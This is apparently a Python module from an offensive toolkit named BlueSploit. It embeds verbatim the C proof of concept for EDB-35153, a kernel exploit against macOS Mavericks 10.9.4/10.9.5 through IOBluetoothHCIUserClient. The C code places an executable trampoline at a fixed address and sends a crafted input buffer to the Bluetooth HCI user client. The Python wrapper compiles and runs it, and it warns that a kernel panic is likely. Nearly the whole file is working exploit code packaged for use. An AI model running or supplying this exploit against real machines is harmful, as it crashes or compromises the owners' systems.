"""
BlueSploit Module: macOS IOBluetoothHCIUserClient SimpleDispatchWL Sign-Check
EDB-ID: 35153  (Mavericks 10.9.4 / 10.9.5, @rpaleari & @joystick)

The original C PoC is embedded verbatim and compiled / executed at runtime
via clang.  Highest fidelity to the researcher's exploit.
"""

from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)
from core.utils.c_runner import compile_and_run, find_compiler
from core.utils.iokit import is_macos


C_SOURCE = r"""
#include <stdio.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <IOKit/IOKitLib.h>

uint64_t payload(void) { return 0; }

int main(void) {
  vm_address_t tgt = 0x0000048800000000;
  vm_allocate(mach_task_self(), &tgt, 0x1000, 0);
  vm_protect(mach_task_self(), tgt, 0x1000, 0,
             VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE);
  memset((void *)tgt, 0, 0x1000);

  char *target = (char *)tgt;
  target[7]  = 0x48; target[8] = 0xb8;
  *((uint64_t *)(&target[9])) = (uint64_t) payload;
  target[17] = 0xff; target[18] = 0xe0;

  printf(" [+] Payload @ %016llx\n", (uint64_t) payload);
  printf(" [+] Trampoline @ %016llx\n", (uint64_t) tgt+7);

  io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
                                IOServiceMatching("IOBluetoothHCIController"));
  if (!service) return -1;
  io_connect_t port = (io_connect_t) 0;
  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
  IOObjectRelease(service);
  if (kr != kIOReturnSuccess) return kr;
  printf(" [+] port: %d\n", port);

  char a[] = "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x07\x02\x00\x00\x00\x11\x0a\x00\x00\x03\x72\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\xfa\x2a\x54\xff\x7f\x00\x00\x78\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xa8\xfb\x2a\x54\xff\x7f\x00\x00\xd8\xfa\x2a\x54\xff\x7f\x00\x00\x60\x4a\xb6\x86"
    "\x80\xff\xff\xff"
    "\xa8\xb6\xf5\xff\x80\xff\xff\xff";

  printf(" [+] Launching exploit!\n");
  kr = IOConnectCallMethod((mach_port_t) port, 0, NULL, 0,
                           (const void*) a, sizeof(a),
                           NULL, NULL, NULL, NULL);
  return IOServiceClose(port);
}
"""


class Module(DosModule):
    info = ModuleInfo(
        name="dos/macos_iobt_simpledispatch",
        description="macOS IOBluetoothHCI SimpleDispatchWL sign-check (EDB-35153, native C)",
        author=["@rpaleari", "@joystick"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=["https://www.exploit-db.com/exploits/35153"],
    )

    def _setup_options(self) -> None:
        self.options = {}

    def run(self) -> bool:
        C = Colors
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}macOS SimpleDispatchWL DoS (EDB-35153){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        if not is_macos():
            print_error("macOS only, kIOMasterPortDefault / IOConnect APIs unavailable")
            return False
        if not find_compiler():
            print_error("No C compiler (install clang via Xcode CLI tools)")
            return False
        print_warning("LOCAL kernel panic likely on unpatched Mavericks 10.9.4/10.9.5")
        print_info("Compiling original C PoC with clang -framework IOKit ...")

        rc, out, err = compile_and_run(
            C_SOURCE, "iobt_simpledispatch",
            ldflags=["-framework", "IOKit"],
        )
        if rc == -1:
            print_error(err.strip())
            return False
        print_info(out)
        if err.strip():
            print_warning(err.strip())
        self.add_result({"edb_id": 35153, "rc": rc, "stdout": out, "stderr": err})
        return rc == 0
